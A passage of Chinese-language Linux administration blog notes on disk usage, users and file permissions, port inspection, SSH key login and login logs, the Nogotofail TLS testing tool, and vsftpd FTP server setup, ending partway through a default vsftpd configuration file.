<h2 id="查看哪个目录占用空间大（比较耗时）"><a href="#查看哪个目录占用空间大（比较耗时）" class="headerlink" title="查看哪个目录占用空间大（比较耗时）"></a>查看哪个目录占用空间大（比较耗时）</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@bogon:/<span class="comment"># du -s /* | sort -nr</span></span><br><span class="line">9199072	/usr</span><br><span class="line">1943584	/var</span><br><span class="line">1858812	/root</span><br><span class="line">746372	/home</span><br><span class="line">733020	/lib</span><br><span class="line">104728	/boot</span><br><span class="line">20356	/lost+found</span><br><span class="line">13616	/sbin</span><br><span class="line">12644	/bin</span><br><span class="line">9308	/etc</span><br><span class="line">6068	/run</span><br><span class="line">3952	/lib32</span><br><span class="line">172	/dump</span><br><span class="line">48	/tmp</span><br><span class="line">20	/data</span><br><span class="line">16	/opt</span><br><span class="line">12	/media</span><br><span class="line">8	/srv</span><br><span class="line">4	/mnt</span><br><span class="line">4	/lib64</span><br><span class="line">0	/vmlinuz.old</span><br><span class="line">0	/vmlinuz</span><br><span class="line">0	/sys</span><br><span class="line">0	/proc</span><br><span class="line">0	/initrd.img.old</span><br><span class="line">0	/initrd.img</span><br><span class="line">0	/dev</span><br></pre></td></tr></table></figure>
<h2 id="查看当前目录文件大小情况"><a href="#查看当前目录文件大小情况" class="headerlink" title="查看当前目录文件大小情况"></a>查看当前目录文件大小情况</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ du -h</span><br><span class="line"></span><br><span class="line">8.0K	./.cmake/packages/libwebsockets</span><br><span class="line">12K	./.cmake/packages</span><br><span class="line">128K	./.java</span><br><span class="line">8.0K	./.vim</span><br><span class="line">...省略</span><br><span class="line">16K	./.aptitude</span><br><span class="line">12K	./.w3m</span><br><span class="line">8.0K	./.config/configstore</span><br><span class="line">12K	./.config</span><br><span class="line">54M	.</span><br></pre></td></tr></table></figure>
<h2 id="创建一个有sudo权限的用户"><a href="#创建一个有sudo权限的用户" class="headerlink" title="创建一个有sudo权限的用户"></a>创建一个有sudo权限的用户</h2><p><a href="https://www.cnblogs.com/xiaouisme/p/10891994.html" target="_blank" rel="noopener">参考</a><br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@bogon:~$ adduser user1</span><br><span class="line">root@bogon:~$ passwd user1</span><br><span class="line">root@bogon:~$ usermod -aG sudo user1 <span class="comment">#添加到sudo组（必须）</span></span><br><span class="line">root@bogon:~$ id user1 <span class="comment"># 确认组信息</span></span><br><span class="line">root@bogon:~$ sudo ls -l /root <span class="comment"># 测试sudo命令</span></span><br><span class="line">root@bogon:~$</span><br></pre></td></tr></table></figure></p>
<h2 id="用户shell环境"><a href="#用户shell环境" class="headerlink" title="用户shell环境"></a>用户shell环境</h2><p>通过 <code>adduser</code> 新建的用户，登录之后没有shell环境，终端不会显示用户名和路径,<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@bogon:~$ vim /etc/passwd # 编辑passwd文件</span><br><span class="line"> 46 user1:x:1003:1003::/home/user1:/bin/bash #给用户增加 /bin/bash</span><br></pre></td></tr></table></figure></p>
<h2 id="修改用户所属的组"><a href="#修改用户所属的组" class="headerlink" title="修改用户所属的组"></a>修改用户所属的组</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@bogon:~$ usermod -g root user1 <span class="comment">#修改到root组</span></span><br><span class="line">root@bogon:~$ usermod -d /home/samwen  samwen <span class="comment">#修改用户登入时的目录</span></span><br></pre></td></tr></table></figure>
<h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><h4 id="chmod修改权限"><a href="#chmod修改权限" class="headerlink" title="chmod修改权限"></a>chmod修改权限</h4><p>Linux的文件权限<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">samwen@bogon:~$ mkdir test</span><br><span class="line">samwen@bogon:~$ vim hello.txt</span><br><span class="line">samwen@bogon:~$ ls -ll</span><br><span class="line">drwxrwxr-x  2 samwen samwen 4096 Aug  7 17:27 test</span><br><span class="line">-rw-rw-r--  1 samwen samwen    6 Aug  7 17:33 hello.txt</span><br></pre></td></tr></table></figure></p>
<table>
<thead>
<tr>
<th>目标</th>
<th>目录</th>
<th>用户</th>
<th>组用户</th>
<th>其他</th>
<th>总值</th>
</tr>
</thead>
<tbody>
<tr>
<td>test</td>
<td>d</td>
<td>rwx</td>
<td>rwx</td>
<td>r-x</td>
<td>775</td>
</tr>
<tr>
<td>hello.txt</td>
<td>-</td>
<td>rw-</td>
<td>rw-</td>
<td>r–</td>
<td>664</td>
</tr>
</tbody>
</table>
<p><code>r</code> ： 只读权限，值等于 <code>4</code> 。</p>
<p><code>w</code> ： 只写权限，值等于 <code>2</code> 。</p>
<p><code>x</code> ： 执行权限，值等于 <code>1</code> 。</p>
<p><code>-</code>： 无权限，值等于 <code>0</code> 。</p>
<p>修改权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@bogon:/home/bogon# chmod -R 760 mydir</span><br></pre></td></tr></table></figure>
<p> <code>760</code> 的意思是：用户读/写/执行权限、组用户读/写权限、其他用户无权限。</p>
<p>常用的权限值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">775：默认创建目录的权限</span><br><span class="line">664：默认创建文件的权限</span><br><span class="line">600：只有所有者有读和写的权限</span><br><span class="line">644：所有者有读和写的权限，组用户只有读的权限</span><br><span class="line">666：每个人都有读和写的权限</span><br><span class="line">700：只有所有者有读和写以及执行的权限</span><br><span class="line">777：每个人都有读和写以及执行的权限</span><br></pre></td></tr></table></figure>
<h4 id="查看文件的所有者等信息"><a href="#查看文件的所有者等信息" class="headerlink" title="查看文件的所有者等信息"></a>查看文件的所有者等信息</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">显示文件夹信息 http://man.linuxde.net/ls</span></span><br><span class="line">ls -ld mydir/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">显示文件夹内信息</span></span><br><span class="line">ls -lh mydir/</span><br></pre></td></tr></table></figure>
<h4 id="chown修改文件所有者和组"><a href="#chown修改文件所有者和组" class="headerlink" title="chown修改文件所有者和组"></a>chown修改文件所有者和组</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown -R 组:用户 目录/</span><br><span class="line"></span><br><span class="line">chown -R bogon:bogon mydir</span><br></pre></td></tr></table></figure>
<h2 id="查找软件的目录"><a href="#查找软件的目录" class="headerlink" title="查找软件的目录"></a>查找软件的目录</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查找软件的目录</span><br><span class="line">root@openapi:~# whereis iptables</span><br><span class="line">iptables: /sbin/iptables /usr/share/iptables /usr/share/man/man8/iptables.8.gz</span><br></pre></td></tr></table></figure>
<h2 id="查看所有端口和使用者"><a href="#查看所有端口和使用者" class="headerlink" title="查看所有端口和使用者"></a>查看所有端口和使用者</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#查看所有端口和使用者</span><br><span class="line">root@bogon:~/apache-tomcat/bin# netstat -tnlp</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1007/sshd       </span><br><span class="line">tcp        0      0 0.0.0.0:8060            0.0.0.0:*               LISTEN      928/nginx       </span><br><span class="line">tcp        0      0 127.0.0.1:9121          0.0.0.0:*               LISTEN      917/redis_exporter</span><br><span class="line">tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      927/prometheus  </span><br><span class="line">tcp        0      0 127.0.0.1:9187          0.0.0.0:*               LISTEN      934/postgres_export</span><br><span class="line">tcp        0      0 127.0.0.1:9100          0.0.0.0:*               LISTEN      923/node_exporter</span><br><span class="line">tcp        0      0 127.0.0.1:9168          0.0.0.0:*               LISTEN      935/ruby        </span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      928/nginx       </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      1007/sshd       </span><br><span class="line">tcp6       0      0 :::8009                 :::*                    LISTEN      110928/java     </span><br><span class="line">tcp6       0      0 :::8080                 :::*                    LISTEN      110928/java     </span><br><span class="line">tcp6       0      0 ::1:9168                :::*                    LISTEN      935/ruby</span><br></pre></td></tr></table></figure>
<h2 id="查看是谁用了某个端口"><a href="#查看是谁用了某个端口" class="headerlink" title="查看是谁用了某个端口"></a>查看是谁用了某个端口</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看是谁用了某个端口</span><br><span class="line">root@bogon:/etc/init.d# lsof -i:1883</span><br><span class="line">COMMAND   PID      USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class="line">mosquitto 733 mosquitto    3u  IPv4  11835      0t0  TCP *:1883 (LISTEN)</span><br><span class="line">mosquitto 733 mosquitto    4u  IPv6  11836      0t0  TCP *:1883 (LISTEN)</span><br></pre></td></tr></table></figure>
<h2 id="管理启动服务"><a href="#管理启动服务" class="headerlink" title="管理启动服务"></a>管理启动服务</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 通过sysv-rc-conf 管理启动服务</span><br><span class="line">#sudo apt-get install sysv-rc-conf</span><br></pre></td></tr></table></figure>
<h2 id="开机启动脚本目录"><a href="#开机启动脚本目录" class="headerlink" title="开机启动脚本目录"></a>开机启动脚本目录</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 开机启动脚本目录（/etc/init.d）</span><br><span class="line">root@bogon:/etc/init.d# ls</span><br><span class="line">acpid              glances      postfix          reboot          sudo</span><br><span class="line">apparmor           grub-common  postgresql       redis-server    udev</span><br><span class="line">apport             halt         pppd-dns         resolvconf      umountfs</span><br><span class="line">atd                irqbalance   procps           rsync           umountnfs.sh</span><br><span class="line">console-setup      killprocs    rabbitmq-server  rsyslog         umountroot</span><br><span class="line">cron               kmod         rc               screen-cleanup  unattended-upgrades</span><br><span class="line">dbus               mysql        rc.local         sendsigs        urandom</span><br><span class="line">dns-clean          netdata      rclocal.backup   single          x11-common</span><br><span class="line">emqttd.dpkg-new    networking   rcS              skeleton</span><br><span class="line">friendly-recovery  ondemand     README           ssh</span><br><span class="line">root@bogon:/etc/init.d#</span><br></pre></td></tr></table></figure>
<h2 id="每个开发人员都应该知道的-10-个-Linux-命令"><a href="#每个开发人员都应该知道的-10-个-Linux-命令" class="headerlink" title="每个开发人员都应该知道的 10 个 Linux 命令"></a>每个开发人员都应该知道的 10 个 Linux 命令</h2><p><a href="https://mp.weixin.qq.com/s/63My8SMHZc_mRL-R9SMeYw" target="_blank" rel="noopener">来源</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">10. file</span><br><span class="line"></span><br><span class="line">返回一个指定文件的信息。例如，你可以用它来输出一个图片文件的尺寸信息。</span><br><span class="line"></span><br><span class="line">file logo.png</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"></span><br><span class="line">&gt; PNG image data, 16 x 16, 8-bit/color RGBA, non-interlaced</span><br><span class="line"></span><br><span class="line">9. iotop, powertop, nethogs</span><br><span class="line"></span><br><span class="line">你如何监控Linux系统中发生了什么？这三个命令可以帮上大忙；</span><br><span class="line"></span><br><span class="line">* iotop: 将进程按磁盘写次数排序，并且显示程序写磁盘的次数和频率。</span><br><span class="line"></span><br><span class="line">* powertop: 将进程按能量消耗列表显示。这是一个重要的命令，尤其是当你在外面不能为你的电脑充电的时候。</span><br><span class="line"></span><br><span class="line">* nethogs: 将进程按网络流量列表显示。</span><br><span class="line"></span><br><span class="line">8. tee</span><br><span class="line"></span><br><span class="line">tee 将程序的输出结果重定向，使得我们可以同时显示和保存结果，例如，添加一个新的条目到hosts文件中:</span><br><span class="line"></span><br><span class="line">echo &quot;127.0.0.1 foobar&quot; | sudo tee -a /etc/hosts</span><br><span class="line"></span><br><span class="line">7. pidof, kill and pkill</span><br><span class="line"></span><br><span class="line">这三个重要命令帮助你控制系统中运行的程序。</span><br><span class="line"></span><br><span class="line">pidof 打印出正在运行程序的进程ID。例如，下面的命令将输出nginx的进程ID:</span><br><span class="line"></span><br><span class="line">pidof nginx</span><br><span class="line"></span><br><span class="line">你可以把nginx的进程ID输入到 kill 命令来终止它。</span><br><span class="line"></span><br><span class="line">kill -USR2 $(pidof nginx)&apos;</span><br><span class="line"></span><br><span class="line">pkill 是一个快捷命令，可以终止匹配的进程:</span><br><span class="line"></span><br><span class="line">pkill -f nginx</span><br><span class="line"></span><br><span class="line">6. tmux</span><br><span class="line"></span><br><span class="line">如果还你没有安装tmux，请一定安装它。 tmux是你终端的优秀窗口和会话管理器。</span><br><span class="line"></span><br><span class="line">5. tree</span><br><span class="line"></span><br><span class="line">以树状格式列出目录的内容。它有简洁的选项，比如只显示目录;</span><br><span class="line"></span><br><span class="line">tree -d</span><br><span class="line">6. dpkg -L</span><br><span class="line">查看某个软件安装了哪些文件,比如查看vsftpd：dpkg -L vsftpd |tac</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>SSH公钥免密码登录</title>
    <url>/Linux/SSH%E5%85%8D%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95/</url>
    <content><![CDATA[<h2 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h2><ol>
<li>客户机Winows</li>
<li>服务器Linux (192.168.0.66)</li>
</ol>
<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><ol>
<li>客户端公钥</li>
</ol>
<p>一般安装了Git，本地都有ssh公钥，在目录 <code>C:\Users\xxx\.ssh</code> (即 <code>~/.ssh</code> )下<br>如果没有，执行ssh-keygen生成。</p>
<ol start="2">
<li>上传公钥</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ssh-copy-id -i  ~/.ssh/id_rsa.pub root@192.168.0.66</span><br><span class="line">root的密码：</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>免密码登录</li>
</ol>
<p>ssh登录<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ssh root@192.168.0.66</span><br></pre></td></tr></table></figure></p>
<p>scp拷贝文件<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ scp -r ./<span class="built_in">test</span>/* root@192.168.0.66:/data/<span class="built_in">test</span></span><br></pre></td></tr></table></figure></p>
<h2 id="删除公钥"><a href="#删除公钥" class="headerlink" title="删除公钥"></a>删除公钥</h2><ol>
<li>登录服务器</li>
<li>vim ~/.ssh/authorized_keys</li>
<li>删除你的公钥</li>
</ol>
<h2 id="查看SSH登录日志"><a href="#查看SSH登录日志" class="headerlink" title="查看SSH登录日志"></a>查看SSH登录日志</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 显示近期用户或终端的登录情况，实际是查看 /var/log/wtmp 这个文件</span></span><br><span class="line">$ last</span><br><span class="line">root     pts/0        192.168.0.30     Tue Oct 12 11:42 - 15:35  (03:53)</span><br><span class="line">root     pts/0        192.168.0.30     Mon Oct 11 14:32 - 14:33  (00:01)</span><br><span class="line">root     pts/0        192.168.0.30     Mon Oct 11 14:25 - 14:27  (00:02)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示用户登录失败的列表，实际是查看 /var/log/btmp 这个文件</span></span><br><span class="line">$ lastb</span><br><span class="line">uftp     ssh:notty    106.52.137.228   Sun Oct  3 13:55 - 13:55  (00:00)</span><br><span class="line">uftp     ssh:notty    106.52.137.228   Sun Oct  3 12:10 - 12:10  (00:00)</span><br><span class="line">uftp     ssh:notty    106.52.137.228   Sun Oct  3 12:10 - 12:10  (00:00)</span><br><span class="line">ftp      ssh:notty    106.52.137.228   Sun Oct  3 09:33 - 09:33  (00:00)</span><br><span class="line">ftp      ssh:notty    106.52.137.228   Sun Oct  3 09:33 - 09:33  (00:00)</span><br><span class="line">nagios   ssh:notty    106.52.137.228   Sun Oct  3 07:14 - 07:14  (00:00)</span><br><span class="line">nagios   ssh:notty    106.52.137.228   Sun Oct  3 07:14 - 07:14  (00:00)</span><br><span class="line">mysql    ssh:notty    106.52.137.228   Sun Oct  3 00:36 - 00:36  (00:00)</span><br><span class="line">oracle   ssh:notty    106.52.137.228   Sat Oct  2 23:27 - 23:27  (00:00)</span><br><span class="line">oracle   ssh:notty    106.52.137.228   Sat Oct  2 23:27 - 23:27  (00:00)</span><br><span class="line">oracle   ssh:notty    106.52.137.228   Sat Oct  2 22:17 - 22:17  (00:00)</span><br><span class="line">oracle   ssh:notty    106.52.137.228   Sat Oct  2 22:17 - 22:17  (00:00)</span><br><span class="line"><span class="comment"># 以上的记录是被攻击了？？？</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>md</tag>
      </tags>
  </entry>
  <entry>
    <title>Nogotofail网络流量安全测试工具</title>
    <url>/Linux/Nogotofail%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p>对于已知的 TLS/SSL 漏洞和错配置，可以通过 Nogotofail 轻松确认您的应用程序是否安全。它是一款自动执行的工具，功能强大并且可扩展，用于测试通过它传送网络流量的任意设备的网络安全问题。 </p>
<p>Nogotofail 可用于三个主要用例： </p>
<ul>
<li>查找错误和漏洞。</li>
<li>验证修复并监测回归。</li>
<li>了解哪些应用和设备正在生成哪些流量。</li>
</ul>
<p>Nogotofail 适用于 Android、iOS、Linux、Windows、Chrome 操作系统、OSX。事实上，任何用于连接互联网的设备都可以使用 Nogotofail。在 Android 和 Linux 上提供了一个易于使用的客户端来配置设置和获取通知，同时还提供了一个本身可作为路由器、VPN 服务器或代理部署的攻击引擎。</p>
<p>您可以在 <a href="https://github.com/google/nogotofail" target="_blank" rel="noopener">Nogotofail</a> 开源项目网站上访问此工具。 </p>
<p>摘自：<a href="https://developer.android.google.cn/training/articles/security-ssl" target="_blank" rel="noopener">https://developer.android.google.cn/training/articles/security-ssl</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>SSH登录缓慢</title>
    <url>/Linux/SSH%E7%99%BB%E5%BD%95%E7%BC%93%E6%85%A2/</url>
    <content><![CDATA[<p>在局域网通过SSH登录Ubuntu服务器，发现很慢，10秒左右，修改SSH配置解决：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo vim /etc/ssh/ssh_config</span><br><span class="line"><span class="comment">#GSSAPIAuthentication yes</span></span><br><span class="line">GSSAPIAuthentication no</span><br><span class="line"></span><br><span class="line">$ systemctl restart sshd</span><br></pre></td></tr></table></figure>
<blockquote>
<p>GSSAPI ( Generic Security Services Application Programming Interface) 是一套类似Kerberos 5 的通用网络安全系统接口。<br>该接口是对各种不同的客户端服务器安全机制的封装，以消除安全接口的不同，降低编程难度。但该接口在目标机器无域名解析时会有问题。</p>
</blockquote>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>md</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 16.04.4 LTS搭建FTP服务</title>
    <url>/Linux/Ubuntu%2016.04.4%20LTS%E6%90%AD%E5%BB%BAFTP%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<h3 id="安装-删除"><a href="#安装-删除" class="headerlink" title="安装/删除"></a>安装/删除</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt-get update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> apt-get install vsftpd</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vsftpd -v</span></span><br><span class="line">vsftpd: version 3.0.3</span><br><span class="line"><span class="meta">$</span><span class="bash"> apt-get purge vsftpd</span></span><br></pre></td></tr></table></figure>
<h3 id="创建ftp用户"><a href="#创建ftp用户" class="headerlink" title="创建ftp用户"></a>创建ftp用户</h3><p>创建一个不能登录到系统的用户，用于vsftpd文件读写<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir /home/ftpsam</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> chown ftpsam:ftpsam /home/ftpsam</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> useradd -d /home/ftpsam -s /sbin/nologin ftpsam</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> passwd ftpsam</span></span><br><span class="line">Enter new UNIX password: </span><br><span class="line">Retype new UNIX password: </span><br><span class="line">passwd: password updated successfully</span><br></pre></td></tr></table></figure></p>
<p>新建文件，存放允许访问ftp的用户<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim /etc/vsftpd.users</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">将刚创建的用户名输进去，一行一个用户</span></span><br><span class="line">ftpsam</span><br></pre></td></tr></table></figure></p>
<h3 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h3><p>注意每行后面不能有空格，否则启动服务失败<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim /etc/vsftpd.conf</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">允许写</span></span><br><span class="line">write_enable=YES</span><br><span class="line">local_umask=022</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">此版本PAM服务的名称改为ftp才行，否则一直报500登录错误</span></span><br><span class="line">pam_service_name=ftp</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">指定登录用户</span></span><br><span class="line">local_enable=YES</span><br><span class="line">local_root=/home/ftpsam</span><br><span class="line">userlist_file=/etc/vsftpd.users</span><br><span class="line">userlist_enable=YES</span><br><span class="line">userlist_deny=NO</span><br></pre></td></tr></table></figure></p>
<p>权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chroot_local_user=YES</span><br><span class="line">allow_writeable_chroot=YES</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意: allow_writeable_chroot 会有安全问题，此处没有做深入验证。</p>
</blockquote>
<h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><p>用ftpclient工具连接的话，用户密码就是我们系统中的ftpsam了，端口是21。</p>
<h3 id="最终运行的完整配置-etc-vsftpd-conf"><a href="#最终运行的完整配置-etc-vsftpd-conf" class="headerlink" title="最终运行的完整配置/etc/vsftpd.conf"></a>最终运行的完整配置/etc/vsftpd.conf</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">listen=NO</span><br><span class="line">listen_ipv6=YES</span><br><span class="line">anonymous_enable=NO</span><br><span class="line">local_enable=YES</span><br><span class="line">write_enable=YES</span><br><span class="line">local_umask=022</span><br><span class="line">dirmessage_enable=YES</span><br><span class="line">use_localtime=YES</span><br><span class="line">xferlog_enable=YES</span><br><span class="line">connect_from_port_20=YES</span><br><span class="line">ftpd_banner=Welcome to FTPSam service.</span><br><span class="line">chroot_local_user=YES</span><br><span class="line">secure_chroot_dir=/var/run/vsftpd/empty</span><br><span class="line">pam_service_name=ftp</span><br><span class="line">rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem</span><br><span class="line">rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key</span><br><span class="line">ssl_enable=NO</span><br><span class="line">utf8_filesystem=YES</span><br><span class="line"><span class="meta">#</span><span class="bash">add</span></span><br><span class="line">local_root=/home/ftpsam</span><br><span class="line">userlist_enable=YES</span><br><span class="line">userlist_file=/etc/vsftpd.users</span><br><span class="line">userlist_deny=NO</span><br><span class="line">allow_writeable_chroot=YES</span><br><span class="line"><span class="meta">#</span><span class="bash">add</span></span><br></pre></td></tr></table></figure>
<h3 id="初始完整的配置文件-未修改的"><a href="#初始完整的配置文件-未修改的" class="headerlink" title="初始完整的配置文件(未修改的)"></a>初始完整的配置文件(未修改的)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">  1 # Example config file /etc/vsftpd.conf</span><br><span class="line">  2 #</span><br><span class="line">  3 # The default compiled in settings are fairly paranoid. This sample file</span><br><span class="line">  4 # loosens things up a bit, to make the ftp daemon more usable.</span><br><span class="line">  5 # Please see vsftpd.conf.5 for all compiled in defaults.</span><br><span class="line">  6 #</span><br><span class="line">  7 # READ THIS: This example file is NOT an exhaustive list of vsftpd options.</span><br><span class="line">  8 # Please read the vsftpd.conf.5 manual page to get a full idea of vsftpd's</span><br><span class="line">  9 # capabilities.</span><br><span class="line"> 10 #</span><br><span class="line"> 11 #</span><br><span class="line"> 12 # Run standalone?  vsftpd can run either from an inetd or as a standalone</span><br><span class="line"> 13 # daemon started from an initscript.</span><br><span class="line"> 14 listen=NO</span><br><span class="line"> 15 #</span><br><span class="line"> 16 # This directive enables listening on IPv6 sockets. By default, listening</span><br><span class="line"> 17 # on the IPv6 "any" address (::) will accept connections from both IPv6</span><br><span class="line"> 18 # and IPv4 clients. It is not necessary to listen on *both* IPv4 and IPv6</span><br><span class="line"> 19 # sockets. If you want that (perhaps because you want to listen on specific</span><br><span class="line"> 20 # addresses) then you must run two copies of vsftpd with two configuration</span><br><span class="line"> 21 # files.</span><br><span class="line"> 22 listen_ipv6=YES</span><br><span class="line"> 23 #</span><br><span class="line"> 24 # Allow anonymous FTP? (Disabled by default).</span><br><span class="line"> 25 anonymous_enable=NO</span><br><span class="line"> 26 #</span><br><span class="line"> 27 # Uncomment this to allow local users to log in.</span><br><span class="line"> 28 local_enable=YES</span><br><span class="line"> 29 #</span><br><span class="line"> 30 # Uncomment this to enable any form of FTP write command.</span><br><span class="line"> 31 #write_enable=YES</span><br><span class="line"> 32 #</span><br><span class="line"> 33 # Default umask for local users is 077. You may wish to change this to 022,</span><br><span class="line"> 34 # if your users expect that (022 is used by most other ftpd's)</span><br><span class="line"> 35 #local_umask=022</span><br><span class="line"> 36 #</span><br><span class="line"> 37 # Uncomment this to allow the anonymous FTP user to upload files. This only</span><br><span class="line"> 38 # has an effect if the above global write enable is activated. Also, you will</span><br><span class="line"> 39 # obviously need to create a directory writable by the FTP user.</span><br><span class="line"> 40 #anon_upload_enable=YES</span><br><span class="line"> 41 #</span><br><span class="line"> 42 # Uncomment this if you want the anonymous FTP user to be able to create</span><br><span class="line"> 43 # new directories.</span><br><span class="line"> 44 #anon_mkdir_write_enable=YES</span><br><span class="line"> 45 #</span><br><span class="line"> 46 # Activate directory messages - messages given to remote users when they</span><br><span class="line"> 47 # go into a certain directory.</span><br><span class="line"> 48 dirmessage_enable=YES</span><br><span class="line"> 49 #</span><br><span class="line"> 50 # If enabled, vsftpd will display directory listings with the time</span><br><span class="line"> 51 # in  your  local  time  zone.  The default is to display GMT. The</span><br><span class="line"> 52 # times returned by the MDTM FTP command are also affected by this</span><br><span class="line"> 53 # option.</span><br><span class="line"> 54 use_localtime=YES</span><br><span class="line"> 55 #</span><br><span class="line"> 56 # Activate logging of uploads/downloads.</span><br><span class="line"> 57 xferlog_enable=YES</span><br><span class="line"> 58 #</span><br><span class="line"> 59 # Make sure PORT transfer connections originate from port 20 (ftp-data).</span><br><span class="line"> 60 connect_from_port_20=YES</span><br><span class="line"> 61 #</span><br><span class="line"> 62 # If you want, you can arrange for uploaded anonymous files to be owned by</span><br><span class="line"> 63 # a different user. Note! Using "root" for uploaded files is not</span><br><span class="line"> 64 # recommended!</span><br><span class="line"> 65 #chown_uploads=YES</span><br><span class="line"> 66 #chown_username=whoever</span><br><span class="line"> 67 #</span><br><span class="line"> 68 # You may override where the log file goes if you like. The default is shown</span><br><span class="line"> 69 # below.</span><br><span class="line"> 70 #xferlog_file=/var/log/vsftpd.log</span><br><span class="line"> 71 #</span><br><span class="line"> 72 # If you want, you can have your log file in standard ftpd xferlog format.</span><br><span class="line"> 73 # Note that the default log file location is /var/log/xferlog in this case.</span><br><span class="line"> 74 #xferlog_std_format=YES</span><br><span class="line"> 75 #</span><br><span class="line"> 76 # You may change the default value for timing out an idle session.</span><br><span class="line"> 77 #idle_session_timeout=600</span><br><span class="line"> 78 #</span><br><span class="line"> 79 # You may change the default value for timing out a data connection.</span><br><span class="line"> 80 #data_connection_timeout=120</span><br><span class="line"> 81 #</span><br><span class="line"> 82 # It is recommended that you define on your system a unique user which the</span><br><span class="line"> 83 # ftp server can use as a totally isolated and unprivileged user.</span><br><span class="line"> 84 #nopriv_user=ftpsecure</span><br><span class="line"> 85 #</span><br><span class="line"> 86 # Enable this and the server will recognise asynchronous ABOR requests. Not</span><br><span class="line"> 87 # recommended for security (the code is non-trivial). Not enabling it,</span><br><span class="line"> 88 # however, may confuse older FTP clients.</span><br><span class="line"> 89 #async_abor_enable=YES</span><br><span class="line"> 90 #</span><br><span class="line"> 91 # By default the server will pretend to allow ASCII mode but in fact ignore</span><br><span class="line"> 92 # the request. Turn on the below options to have the server actually do ASCII</span><br><span class="line"> 93 # mangling on files when in ASCII mode.</span><br><span class="line"> 94 # Beware that on some FTP servers, ASCII support allows a denial of service</span><br><span class="line"> 95 # attack (DoS) via the command "SIZE /big/file" in ASCII mode. vsftpd</span><br><span class="line"> 96 # predicted this attack and has always been safe, reporting the size of the</span><br><span class="line"> 97 # raw file.</span><br><span class="line"> 98 # ASCII mangling is a horrible feature of the protocol.</span><br><span class="line"> 99 #ascii_upload_enable=YES</span><br><span class="line">100 #ascii_download_enable=YES</span><br><span class="line">101 #</span><br><span class="line">102 # You may fully customise the login banner string:</span><br><span class="line">103 #ftpd_banner=Welcome to blah FTP 